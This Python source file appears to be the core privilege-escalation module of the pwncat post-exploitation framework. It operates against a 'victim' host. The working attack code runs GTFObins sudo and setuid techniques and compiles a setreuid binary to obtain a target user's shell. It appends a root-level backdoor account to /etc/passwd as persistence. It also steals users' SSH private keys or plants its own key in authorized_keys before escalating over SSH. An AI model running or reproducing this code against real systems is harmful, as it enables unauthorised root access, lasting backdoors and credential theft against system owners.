#!/usr/bin/env python3
from typing import List, Dict, Tuple
from io import BytesIO, StringIO
import dataclasses
import textwrap
import time
import crypt
import os

# import rich.prompt
from rich.prompt import Confirm

import pwncat
from pwncat.util import console
from pwncat.modules import (
    BaseModule,
    Argument,
    Status,
    Bool,
    Result,
    ArgumentFormatError,
    ModuleFailed,
)
from pwncat.modules.persist import PersistType, PersistModule, PersistError
from pwncat.gtfobins import Capability
from pwncat.file import RemoteBinaryPipe
from pwncat.util import CompilationError


class EscalateError(ModuleFailed):
    """ Indicates an error while attempting some escalation action """


def fix_euid_mismatch(
    escalate: "EscalateModule", exit_cmd: str, target_uid: int, target_gid: int
):
    """ Attempt to gain EUID=UID=target_uid.

    This is intended to fix EUID/UID mismatches after a escalation.
    """

    pythons = [
        "python",
        "python3",
        "python3.6",
        "python3.8",
        "python3.9",
        "python2.7",
        "python2.6",
    ]
    for python in pythons:
        python_path = pwncat.victim.which(python)
        if python_path is not None:
            break

    if python_path is not None:
        command = f"exec {python_path} -c '"
        command += f"""import os; os.setreuid({target_uid}, {target_uid}); os.setregid({target_gid}, {target_gid}); os.system("{pwncat.victim.shell}")"""
        command += "'\n"
        pwncat.victim.process(command)

        new_id = pwncat.victim.id
        if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
            return

    try:
        # Try to compile a binary
        remote_binary = pwncat.victim.compile(
            [
                StringIO(
                    textwrap.dedent(
                        f"""
                        #include <stdio.h>
                        #include <unistd.h>
                        int main() {{
                            setreuid({target_uid}, {target_uid});
                            setregid({target_gid}, {target_gid});
                            execl("{pwncat.victim.shell}", "{pwncat.victim.shell}", NULL);
                        }}
                        """
                    )
                )
            ]
        )
        pwncat.victim.run(remote_binary, wait=False)

        # Check id again
        new_id = pwncat.victim.id
        if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
            pwncat.victim.run(f"rm -f {remote_binary}")
            return
        else:
            pwncat.victim.run(f"rm -f {remote_binary}")
    except CompilationError:
        pass

    for module in pwncat.modules.match("persist.*", base=PersistModule):
        if PersistType.LOCAL not in module.TYPE:
            continue

        try:
            module.run(
                progress=escalate.progress,
                user=pwncat.victim.find_user_by_id(target_uid),
            )
        except PersistError:
            continue

        try:
            module.run(
                progress=escalate.progress,
                user=pwncat.victim.find_user_by_id(target_uid),
                escalate=True,
            )
        except PersistError:
            module.run(
                progress=escalate.progress,
                user=pwncat.victim.find_user_by_id(target_uid),
                remove=True,
            )
            continue

        return "exit\n" + exit_cmd

    pwncat.victim.client.send(exit_cmd.encode("utf-8"))
    pwncat.victim.flush_output()

    raise EscalateError("failed to resolve euid/uid mismatch")


def euid_fix(technique_class):
    """
    Decorator for Technique classes which may end up with a RUID/EUID
    mismatch. This will check the resulting UID after to see
    if the change was affective and attempt to fix it. If the fix fails,
    then the resulting action is undone and an EscalateError is raised.
    """

    class Wrapper(technique_class):
        def exec(self, binary: str):

            # Run the real exec
            result = super(Wrapper, self).exec(binary)

            # Check id again
            ending_id = pwncat.victim.id

            # If needed fix the UID
            if ending_id["euid"]["id"] != ending_id["uid"]["id"]:
                fix_euid_mismatch(
                    self.module,
                    result,
                    ending_id["euid"]["id"],
                    ending_id["egid"]["id"],
                )

            return result

    return Wrapper


@dataclasses.dataclass
class Technique:
    """ Describes a technique possible through some module.

    Modules should subclass this class in order to implement
    their techniques. Only the methods corresponding to the
    returned `caps` need be implemented.
    """

    caps: Capability
    """ What capabilities this technique provides """
    user: str
    """ The user this provides access as """
    module: "EscalateModule"
    """ The module which provides these capabilities """

    def write(self, filepath: str, data: bytes):
        """ Write the given data to the specified file as another user.

        :param filepath: path to the target file
        :type filepath: str
        :param data: the data to write
        :type data: bytes
        """
        raise NotImplementedError

    def read(self, filepath: str):
        """ Read the given file as the specified user

        :param filepath: path to the target file
        :type filepath: str
        :return: A file-like object representing the remote file
        :rtype: File-like
        """
        raise NotImplementedError

    def exec(self, binary: str):
        """ Execute a shell as the specified user.

        :param binary: the shell to execute
        :type binary: str
        :return: A string which when sent over the socket exits this shell
        :rtype: str
        """
        raise NotImplementedError

    def __str__(self):

        cap_names = {
            Capability.READ: "file read",
            Capability.WRITE: "file write",
            Capability.SHELL: "shell",
        }

        return (
            f"[magenta]{cap_names[self.caps]}[/magenta] as [green]{self.user}[/green] "
            f"via {self.module.human_name(self)}"
        )


class GTFOTechnique(Technique):
    """ A technique which is based on a GTFO binary capability.
    This is mainly used for sudo and setuid techniques, but could theoretically
    be used for other techniques.

    :param target_user: The user which this techniques allows access as
    :type target_user: str
    :param module: The module which generated this technique
    :type module: EscalateModule
    :param method: The GTFObins MethodWrapper
    :type method: pwncat.gtfobins.MethodWrapper
    :param kwargs: Arguments passed to the gtfobins ``build`` method.
    """

    def __init__(
        self,
        target_user: str,
        module: "EscalateModule",
        method: pwncat.gtfobins.MethodWrapper,
        **kwargs,
    ):
        super(GTFOTechnique, self).__init__(method.cap, target_user, module)
        self.method = method
        self.kwargs = kwargs

    def write(self, filepath: str, data: str):

        if not isinstance(data, bytes):
            data = data.encode("utf-8")

        payload, input_data, exit_cmd = self.method.build(
            lfile=filepath, length=len(data), **self.kwargs
        )

        mode = "w"
        if self.method.stream is pwncat.gtfobins.Stream.RAW:
            mode += "b"

        try:
            printable = pwncat.util.isprintable(data)
        except UnicodeDecodeError:
            printable = False

        if self.method.stream == pwncat.gtfobins.Stream.PRINT and not printable:
            raise EscalateError(f"{self}.write: input data not printable")

        # Run the command
        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        time.sleep(0.5)

        # Write the data and close the process
        with self.method.wrap_stream(pipe) as pipe:
            pipe.write(data)

    def read(self, filepath: str):

        payload, input_data, exit_cmd = self.method.build(lfile=filepath, **self.kwargs)

        mode = "r"
        if self.method.stream is pwncat.gtfobins.Stream.RAW:
            mode += "b"

        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        return self.method.wrap_stream(pipe)

    def exec(self, binary: str):

        payload, input_data, exit_cmd = self.method.build(shell=binary, **self.kwargs)

        # Run the initial command
        pwncat.victim.run(payload, wait=False)

        # Send required input
        pwncat.victim.client.send(input_data.encode("utf-8"))

        # Return the command to close out completely
        return exit_cmd


@dataclasses.dataclass
class FileContentsResult(Result):
    """ Result which contains the contents of a file. This is the
    result returned from an ``EscalateModule`` when the ``read``
    parameter is true. It allows for the file to be used as a
    stream programmatically, and also nicely formats the file data
    if run from the prompt. """

    filepath: str
    """ Path to the file which this data came from """
    pipe: RemoteBinaryPipe
    """ Until it is read, this is a stream which will return
    the file data from the victim. It should not be used directly,
    and instead should be accessed through the ``stream`` property. """
    data: bytes = None
    """ The data that was read from the file. It is buffered here
    to allow multiple reads when the data is streamed back from the
    remote host. It should not be accessed directly, instead use the
    ``stream`` property to access a stream of data regardless of the
    state of the underlying ``pipe`` object. """

    @property
    def category(self):
        """
        :meta private:
        """
        return None

    @property
    def title(self):
        """:meta private:"""
        return f"Contents of {self.filepath}"

    @property
    def description(self):
        """:meta private:"""
        with self.stream:
            return self.stream.read().decode("utf-8")

    @property
    def stream(self):
        """
        Access the file data. This should be used to access the
        data. The ``pipe`` and ``data`` properties should not
        be used. This is a file-like object which contains the
        raw file data.
        """
        if self.pipe is not None:
            with self.pipe:
                self.data = self.pipe.read()
            self.pipe = None

        return BytesIO(self.data)


@dataclasses.dataclass
class EscalateChain(Result):
    """ Chain of techniques used to escalate. When escalating
    through multiple users, this allows ``pwncat`` to easily
    track the different techniques and users that were traversed.
    When ``exec`` is used, this object is returned instead of
    the ``EscalateResult`` object.

    It has methods to unwrap the escalations to return to the
    original user if needed.

    """

    user: str
    """ Initial user before escalation """
    chain: List[Tuple[Technique, str]]
    """ Chain of techniques used to escalate """

    @property
    def category(self):
        """:meta private:"""
        return None

    @property
    def title(self):
        """:meta private:"""
        return "Escalation Route"

    @property
    def description(self):
        """:meta private:"""
        result = []
        for i, (technique, _) in enumerate(self.chain):
            result.append(f"{(i+1)*' '}[yellow]\u2ba1[/yellow] {technique}")
        return "\n".join(result)

    def add(self, technique: Technique, exit_cmd: str):
        """ Add a link in this chain. """
        self.chain.append((technique, exit_cmd))

    def extend(self, chain: "EscalateChain"):
        """ Extend this chain with another chain. The two chains
        are concatenated. """
        self.chain.extend(chain.chain)

    def pop(self):
        """ Exit and remove the last link in the chain """
        _, exit_cmd = self.chain.pop()
        pwncat.victim.client.send(exit_cmd.encode("utf-8"))
        pwncat.victim.reset(hard=False)
        pwncat.victim.update_user()

    def unwrap(self):
        """ Exit each shell in the chain with the provided exit script.
        This should return the state of the remote shell to prior to
        escalation."""

        # Go through the chain in reverse
        for technique, exit_cmd in self.chain[::-1]:
            # Send the exit command
            pwncat.victim.client.send(exit_cmd.encode("utf-8"))

        pwncat.victim.reset(hard=False)
        pwncat.victim.update_user()


class EscalateResult(Result):
    """ The result of running an escalate module. This object contains
    all the enumerated techniques and provides an abstract way to employ
    the techniques to attempt privilege escalation. This is the meat and
    bones of the automatic escalation logic, and shouldn't generally need
    to be modified. It will put together basic techniques into a working
    primitive.

    :param techniques: List of techniques that were enumerated
    :type techniques: Dict[str, List[Technique]]
    """

    techniques: Dict[str, List[Technique]]
    """ List of techniques available keyed by the user """

    def __init__(self, techniques: Dict[str, List[Technique]]):

        self.techniques: Dict[str, List[Technique]] = {}
        for key, value in techniques:
            self.techniques[key] = sorted(
                techniques[key], key=lambda v: v.module.PRIORITY
            )

    @property
    def category(self):
        """ EscalateResults are uncategorized

        :meta private:
        """
        return None

    @property
    def title(self):
        """ The title of the section when displayed on the terminal

        :meta private:
        """
        return "Escalation Techniques"

    @property
    def description(self):
        """ Description of these results (list of techniques)

        :meta private:
        """

        result = []
        for user, techniques in self.techniques.items():
            for technique in techniques:
                result.append(f"  - {technique}")

        return "\n".join(result)

    def extend(self, result: "EscalateResult"):
        """ Extend this result with another escalation enumeration result.
        This allows you to enumerate multiple modules and utilize all their
        techniques together to perform escalation. """

        for key, value in result.techniques.items():
            if key not in self.techniques:
                self.techniques[key] = sorted(value, key=lambda v: v.module.PRIORITY)
            else:
                self.techniques[key].extend(value)
                self.techniques[key] = sorted(
                    self.techniques[key], key=lambda v: v.module.PRIORITY
                )

    def add(self, technique: Technique):
        """ Add a new technique to this result object """
        if technique.user not in self.techniques:
            self.techniques[technique.user] = [technique]
        else:
            self.techniques[technique.user].append(technique)

    def write(
        self, user: str, filepath: str, data: bytes, progress, no_exec: bool = False
    ):
        """
        Attempt to use all the techniques enumerated to write to a file
        as the given user

        :param user: The user you would like to write a file as
        :type user: str
        :param filepath: The file you would like to write to
        :type filepath: str
        :param data: The data you would like to place in the file
        :type data: bytes
        :param progress: A rich Progress bar to update during escalation.
        :param no_exec: When true, do not attempt exec to write the file.
            This is needed when recursing automatically, and should normally
            be left as false.
        :type no_exec: bool
        """

        if user not in self.techniques:
            raise EscalateError(f"file write as {user} not possible")

        # See if we can perform this action directly
        for technique in self.techniques[user]:
            if Capability.WRITE in technique.caps:
                try:
                    technique.write(filepath, data)
                    return technique
                except EscalateError:
                    continue

        if no_exec:
            raise EscalateError(f"file write as {user} not possible")

        # Can't perform directly. Can we escalate to the user with a shell?
        try:
            exit_cmd = self.exec(user, shell="/bin/sh", progress=progress)
        except EscalateError:
            raise EscalateError(f"file write as {user} not possible")

        # We are now running in a shell as this user, just write the file
        try:
            with pwncat.victim.open(filepath, "w", length=len(data)) as filp:
                filp.write(data)
        except (PermissionError, FileNotFoundError):
            raise EscalateError(f"file write as {user} not possible")

        # Send the exit command to return to the previous user/undo what we
        # did to get here.
        exit_cmd.unwrap()

        return exit_cmd.chain[0][0]

    def read(self, user: str, filepath: str, progress, no_exec: bool = False):
        """ Attempt to use all the techniques enumerated to read a file
        as the given user. This method returns a file-like object capable
        of reading the file.

        :param user: The user to read the file as
        :type user: str
        :param filepath: Path to the file to read
        :type filepath: str
        :param progress: A rich Progress bar to update during escalation.
        :param no_exec: When true, do not attempt exec to write the file.
            This is needed when recursing automatically, and should normally
            be left as false.
        :type no_exec: bool
        """

        if user not in self.techniques:
            raise EscalateError(f"file read as {user} not possible")

        # See if we can perform this action directly
        for technique in self.techniques[user]:
            if Capability.READ in technique.caps:
                try:
                    return technique.read(filepath), technique
                except EscalateError:
                    continue

        if no_exec:
            raise EscalateError(f"file read as {user} not possible")

        # Can't perform directly. Can we escalate to the user with a shell?
        try:
            exit_cmd = self.exec(user, shell="/bin/sh", progress=progress)
        except EscalateError:
            raise EscalateError(f"file read as {user} not possible")

        # We are now running in a shell as this user, just write the file
        try:
            filp = pwncat.victim.open(filepath, "r",)
            # Our exit command needs to be run as well when the file is
            # closed
            original_close = filp.close

            def new_close():
                original_close()
                exit_cmd.unwrap()

            filp.close = new_close

            return filp, exit_cmd.chain[0][0]
        except (PermissionError, FileNotFoundError):
            raise EscalateError(f"file read as {user} not possible")

    def _read_auth_keys(self, user: str, progress):
        """ Attempt to read the users authorized keys file. """

        for fact in pwncat.modules.run(
            "enumerate.gather", types=["service.sshd.config"], progress=progress
        ):
            if "AuthorizedKeysFile" in fact.data:
                authkeys_paths = fact.data["AuthorizedKeysFile"].split(" ")
                for i in range(len(authkeys_paths)):
                    path = authkeys_paths[i].replace("%%", "%")
                    path = path.replace("%h", pwncat.victim.users[user].homedir)
                    path = path.replace("%u", user)
                    if not path.startswith("/"):
                        path = os.path.join(pwncat.victim.users[user].homedir, path)
                    authkeys_paths[i] = path
                break
            if "AuthorizedKeysCommand" in fact.data:
                authkeys_paths = []
                break
        else:
            authkeys_paths = [
                os.path.join(pwncat.victim.users[user].homedir, ".ssh/authorized_keys")
            ]

        # Failed
        if not authkeys_paths:
            return None

        try:
            for path in authkeys_paths:
                filp, _ = self.read(user, path, progress, no_exec=True)
                with filp:
                    authkeys = (
                        filp.read()
                        .strip()
                        .decode("utf-8")
                        .replace("\r\n", "\n")
                        .split("\n")
                    )
                    authkeys_path = path
        except EscalateError:
            authkeys = None
            authkeys_path = None if not authkeys_paths else authkeys_paths[0]

        return authkeys, authkeys_path

    def _leak_private_key(self, user: str, progress, auth_keys: List[str]):
        """ Attempt to leak a user's private key """

        privkey_names = ["id_rsa"]
        for privkey_name in privkey_names:
            privkey_path = os.path.join(
                pwncat.victim.users[user].homedir, ".ssh", privkey_name
            )
            pubkey_path = privkey_path + ".pub"

            try:
                filp, technique = self.read(user, privkey_path, progress, no_exec=True)
                with filp:
                    privkey = (
                        filp.read().replace(b"\r\n", b"\n").decode("utf-8").rstrip("\n")
                        + "\n"
                    )
            except EscalateError:
                progress.log(f"reading failed :(")
                continue

            try:
                filp, _ = self.read(user, pubkey_path, progress, no_exec=True)
                with filp:
                    pubkey = filp.read().strip().decode("utf-8")
            except EscalateError:
                pubkey = None

            # If we have authorized keys and a public key,
            # verify this key is valid
            if auth_keys is not None and pubkey is not None:
                if pubkey not in auth_keys:
                    continue

            return privkey, technique

        return None, None

    def _write_authorized_key(
        self, user: str, pubkey: str, authkeys: List[str], authkeys_path: str, progress
    ):
        """ Attempt to Write the given public key to the user's authorized
        keys file. Return True if successful, otherwise return False.

        The authorized keys file will be overwritten with the contents of the given
        authorized keys plus the specified public key. You should read the authorized
        keys file first in order to not clobber any existing keys.
        """

        try:
            authkeys.append(pubkey.rstrip("\n"))
            data = "\n".join(authkeys)
            data = data.rstrip("\n") + "\n"
            technique = self.write(
                user, authkeys_path, data.encode("utf-8"), progress, no_exec=True
            )
        except EscalateError:
            return None

        return technique

    def exec(self, user: str, shell: str, progress):
        """ Attempt to use all the techniques enumerated to execute a
        shell as the specified user.

        :param user: The user to execute a shell as
        :type user: str
        :param shell: The shell to execute
        :type shell: str
        :param progress: A rich Progress bar to update during escalation.
        """

        original_user = pwncat.victim.current_user
        original_id = pwncat.victim.id
        target_user = pwncat.victim.users[user]
        task = progress.add_task("", module="escalating", status="...")

        # Ensure all output is flushed
        pwncat.victim.flush_output()

        # Ensure we are in a safe directory
        pwncat.victim.chdir("/tmp")

        if user in self.techniques:
            for technique in self.techniques[user]:
                if Capability.SHELL in technique.caps:
                    try:
                        progress.update(task, status=str(technique))
                        exit_cmd = technique.exec(shell)

                        # These are evil, but required due to latency... :/
                        time.sleep(0.1)

                        # Ensure we are stable
                        pwncat.victim.reset(hard=False)
                        pwncat.victim.update_user()

                        # Check that the escalation succeeded
                        new_id = pwncat.victim.id
                        if new_id["euid"]["id"] != target_user.id:
                            pwncat.victim.client.send(exit_cmd.encode("utf-8"))
                            pwncat.victim.flush_output(some=False)
                            continue

                        progress.update(task, visible=False, done=True)

                        return EscalateChain(
                            original_user.name, [(technique, exit_cmd)]
                        )
                    except EscalateError:
                        continue

        # Read /etc/passwd
        progress.update(task, status="reading /etc/passwd")
        with pwncat.victim.open("/etc/passwd", "r") as filp:
            passwd = filp.readlines()

        username = pwncat.config["backdoor_user"]
        password = pwncat.config["backdoor_pass"]
        hashed = crypt.crypt(password)

        passwd.append(f"{username}:{hashed}:0:0::/root:{pwncat.victim.shell}\n")
        passwd_content = "".join(passwd)

        try:
            progress.update(task, status="attempting to overwrite /etc/passwd")
            # Add a new user
            technique = self.write(
                "root",
                "/etc/passwd",
                passwd_content.encode("utf-8"),
                progress,
                no_exec=True,
            )

            # Register the passwd persistence
            progress.update(task, status="registering persistence")
            pwncat.modules.find("persist.passwd").register(
                user="root",
                backdoor_user=username,
                backdoor_pass=password,
                shell=pwncat.victim.shell,
            )

            # Reload user database
            pwncat.victim.reload_users()

            try:
                # su to root
                progress.update(task, status="escalating to root")
                pwncat.victim.su(username, password)
                exit_cmd = "exit\n"

                if user != "root":
                    # We're now root, passwords don't matter
                    progress.update(task, status=f"moving laterally to {user}")
                    pwncat.victim.su(user, None)
                    exit_cmd += "exit\n"

                # Notify user that persistence was installed
                progress.log("installed persist.passwd module for escalation")

                return EscalateChain(original_user.name, [(technique, exit_cmd)])
            except PermissionError:
                pass
        except EscalateError:
            pass

        progress.update(task, status="checking for ssh server")

        # Enumerate system services loooking for an sshd service
        sshd = None
        for fact in pwncat.modules.run(
            "enumerate.gather", progress=progress, types=["system.service"]
        ):
            if "sshd" in fact.data.name and fact.data.state == "running":
                sshd = fact.data

        # Look for the `ssh` binary
        ssh_path = pwncat.victim.which("ssh")

        # If ssh is running, and we have a local `ssh`, then we can
        # attempt to leak private keys via readers/writers and
        # escalate with an ssh user@localhost
        if sshd is not None and sshd.state == "running" and ssh_path:

            # Read the user's authorized keys
            progress.update(task, status="attempting to read authorized keys")
            authkeys, authkeys_path = self._read_auth_keys(user, progress)

            # Attempt to read private key
            progress.update(task, status="attempting to read private keys")
            privkey, used_tech = self._leak_private_key(user, progress, authkeys)

            # We couldn't read the private key
            if privkey is None:

                try:
                    # Read our backdoor private key
                    with open(pwncat.config["privkey"], "r") as filp:
                        privkey = filp.read()
                    with open(pwncat.config["privkey"] + ".pub", "r") as filp:
                        pubkey = filp.read()

                    if authkeys is None:
                        # This is important. Ask the user if they want to
                        # clobber the authorized keys
                        progress.stop()
                        if Confirm(
                            "could not read authorized keys; attempt to clobber user keys?"
                        ):
                            authkeys = []
                        progress.start()

                    # Attempt to write to the authorized keys file
                    if authkeys is None:
                        progress.update(
                            task, status="attemping to write authorized keys"
                        )
                        used_tech = self._write_authorized_key(
                            user, pubkey, authkeys, authkeys_path, progress
                        )
                        if used_tech is None:
                            privkey = None

                except (FileNotFoundError, PermissionError):
                    privkey = None

            if privkey is not None:

                # Write the private key to a temporary file for local usage
                progress.update(task, status="uploading private key")
                with pwncat.victim.tempfile("w", length=len(privkey)) as filp:
                    filp.write(privkey)
                    privkey_path = filp.name

                # Ensure we track this new file
                tamper = pwncat.victim.tamper.created_file(privkey_path)
                # SSH needs strict permissions
                progress.update(task, status="fixing private key permissions")
                pwncat.victim.run(f"chmod 600 {privkey_path}")

                # First, run a test to make sure we authenticate
                progress.update(task, status="testing local escalation")
                command = (
                    f"{ssh_path} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
                    f"{user}@127.0.0.1"
                )
                output = pwncat.victim.run(f"{command} echo good")

                # We failed. Remove the private key and raise an
                # exception
                if b"good" not in output:
                    tamper.revert()
                    pwncat.victim.tamper.remove(tamper)
                    raise EscalateError("ssh private key failed")

                # The test worked! Run the real escalate command
                progress.update(task, status="escalating via ssh!")
                pwncat.victim.process(command)

                pwncat.victim.reset(hard=False)
                pwncat.victim.update_user()

                progress.update(task, visible=False, done=True)

                return EscalateChain(original_user.name, [(used_tech, "exit")])

        progress.update(task, visible=False, done=True)

        raise EscalateError(f"exec as {user} not possible")


class EscalateModule(BaseModule):
    """ The base module for all escalation modules. This module
    is responsible for enumerating ``Technique`` objects which
    can be used to attempt various escalation actions.

    With no arguments, a standard escalate module will return
    an ``EscalateResult`` object which contains all techniques
    enumerated and provides helper methods for programmatically
    performing escalation and combining results from multiple
    modules.

    Alternatively, the ``exec``, ``write``, and ``read`` arguments
    can be used to have the module automatically attempt the
    respective operation basedo on the arguments passed.
    """

    ARGUMENTS = {
        "user": Argument(
            str, default="root", help="The user you would like to escalate to"
        ),
        "exec": Argument(
            Bool, default=False, help="Attempt escalation only using this module"
        ),
        "write": Argument(
            Bool, default=False, help="Attempt to write a file using this module"
        ),
        "read": Argument(
            Bool, default=False, help="Attempt to read a file using this module"
        ),
        "shell": Argument(str, default="current", help="The shell to use for exec"),
        "path": Argument(str, default=None, help="The file to read/write"),
        "data": Argument(str, default=None, help="The data to write to a file"),
    }
    # This causes the BaseModule to collapse a single generator result
    # into it's value as opposed to returning a list with one entry.
    # This allows us to use `yield Status()` to update the progress
    # while still returning a single value
    COLLAPSE_RESULT = True

    PRIORITY = 100
    """ The priority of this escalation module. Values <= 0 are reserved.
    Indicates the order in which techniques are executed when attempting
    escalation. Lower values execute first. """

    def run(self, user, exec, read, write, shell, path, data, **kwargs):
        """ This method is not overriden by subclasses. Subclasses should
        should implement the ``enumerate`` method which yields techniques.

        Running a module results in an EnumerateResult object which can be
        formatted by the default `run` command or used to execute various
        privilege escalation primitives utilizing the techniques enumerated.
        """

        if (exec + read + write) > 1:
            raise ArgumentFormatError(
                "only one of exec, read, and write may be specified"
            )

        if path is None and (read or write):
            raise ArgumentFormatError("path not specified for read/write")

        if data is None and write:
            raise ArgumentFormatError("data not specified for write")

        result = EscalateResult({})

        yield Status("gathering techniques")

        for technique in self.enumerate(**kwargs):
            yield Status(technique)
            result.add(technique)

        if shell == "current":
            shell = pwncat.victim.shell

        if exec:
            yield result.exec(user=user, shell=shell, progress=self.progress)
        elif read:
            filp = result.read(user=user, filepath=path, progress=self.progress)
            yield FileContentsResult(path, filp)
        elif write:
            yield result.write(
                user=user, filepath=path, data=data, progress=self.progress
            )
        else:
            yield result

    def enumerate(self, **kwargs) -> "Generator[Technique, None, None]":
        """ Enumerate techniques for this module. Each technique must
        implement at least one capability, and all techniques will be
        used together to escalate privileges. Any custom arguments
        are passed to this method through keyword arguments. None of
        the default arguments are passed here.

        """
        while False:
            yield None

        raise NotImplementedError

    def human_name(self, tech: "Technique"):
        """ Defines the human readable name/description of this vuln """
        return self.name
